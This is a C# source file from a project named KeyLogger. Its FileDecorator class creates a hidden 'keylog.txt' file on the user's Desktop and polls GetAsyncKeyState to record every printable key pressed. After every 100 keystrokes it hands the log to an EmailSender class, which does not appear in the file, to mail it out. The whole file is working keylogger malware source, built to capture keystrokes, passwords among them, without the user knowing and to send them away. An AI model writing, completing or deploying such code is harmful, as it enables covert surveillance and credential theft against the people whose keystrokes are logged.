using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace KeyLogger
{
    class FileDecorator
    {
        string folder;
        string file;

        public void CreateFile()
        {
            folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            
            if (!Directory.Exists(folder))
            {
                Directory.CreateDirectory(folder);
            }

            file = folder + @"\keylog.txt";

            if (!File.Exists(file))
            {
                using (StreamWriter sw = File.CreateText(file)) { }
            }

            File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
        }

        public string WriteFile()
        {
            int keySt = default;
            int numberOfKeyStroke = default;

            EmailSender emailSender = new EmailSender();

            using (StreamWriter sw = File.AppendText(file))
            {
                for (int keyNumber = 32; keyNumber < 127; keyNumber++)
                {
                    keySt = KeyState.GetAsyncKeyState(keyNumber);

                    if (keySt == short.MinValue + 1)
                    {
                        sw.Write((char)keyNumber);
                        numberOfKeyStroke++;

                        if (numberOfKeyStroke % 100 == 0)
                        {
                            emailSender.SendMessage(file);
                        }
                    }
                }

                return file;
            }
        }
    }
}
